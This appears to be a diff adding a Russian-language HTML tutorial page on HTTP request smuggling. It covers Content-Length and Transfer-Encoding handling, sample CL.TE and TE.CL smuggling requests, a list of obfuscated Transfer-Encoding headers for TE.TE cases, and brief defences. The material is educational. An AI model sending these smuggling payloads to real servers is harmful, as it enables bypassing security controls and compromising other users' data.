@@ -1,0 +1,87 @@
+<p>
+    <b>HTTP request smuggling</b> — это атака, при которой злоумышленник вмешивается в обработку последовательности
+    HTTP-запросов,
+    которую веб-приложение получает от одного или нескольких пользователей. Уязвимости, связанные с HTTP request
+    smuggling,
+    часто имеют критический характер, позволяя злоумышленнику обойти меры безопасности, получить несанкционированный
+    доступ
+    к конфиденциальным данным и напрямую скомпрометировать информацию других пользователей приложения.
+</p>
+<img width="100%" src="img/http_smuggling2.jpg" alt="">
+<p>
+    Заголовок <u><b>Content-Length</b></u> определяет длину тела сообщения в байтах.
+</p>
+<pre>POST /search HTTP/1.1
+    Host: normal-website.com
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 11
+    
+    q=smuggling
+    </pre>
+<p>
+    Заголовок <u><b>Transfer-Encoding</b></u> может использоваться для указания того, что тело сообщения разбито на
+    блоки
+</p>
+<pre>POST /search HTTP/1.1
+    Host: normal-website.com
+    Content-Type: application/x-www-form-urlencoded
+    Transfer-Encoding: chunked
+    
+    b
+    q=smuggling
+    0
+    </pre>
+
+<h2>Уязвимости CL.TE</h2>
+фронтенд сервер использует заголовок Content-Length, а бэкенд сервер — Transfer-Encoding.
+<pre>POST / HTTP/1.1
+    Host: vulnerable-website.com
+    Content-Length: 13
+    Transfer-Encoding: chunked
+    
+    0
+    
+    SMUGGLED
+    </pre>
+
+<h2>Уязвимости TE.CL</h2>
+фронтенд сервер использует заголовок Transfer-Encoding, а бэкенд сервер — Content-Length.
+<pre>POST / HTTP/1.1
+    Host: vulnerable-website.com
+    Content-Length: 3
+    Transfer-Encoding: chunked
+    
+    8
+    SMUGGLED
+    0
+    </pre>
+
+
+<h2>Поведение TE.TE: обфускация TE заголовка</h2>
+фронтенд и бэкенд серверы поддерживают заголовок Transfer-Encoding, но один из серверов может быть вынужден не
+обрабатывать его, если тот был обфусцирован.
+<pre>Transfer-Encoding: xchunked
+    
+    Transfer-Encoding : chunked
+    
+    Transfer-Encoding: chunked
+    Transfer-Encoding: x
+    
+    Transfer-Encoding:[tab]chunked
+    
+    [space]Transfer-Encoding: chunked
+    
+    X: X[\
+    ]Transfer-Encoding: chunked
+    
+    Transfer-Encoding
+    : chunked
+    </pre>
+
+<hr>
+
+<h2>Защита</h2>
+Используйте для каждого запроса своё подключение между бэкенд и фронтендом. <br>
+Используйте HTTP/2 для бэкенд подключений, так как этот протокол предотвращает неоднозначность в интерпретации длины
+соощений. <br>
+Используйте одно и то же программное обеспечение веб-сервера для фронтенд и бэкенд серверов.
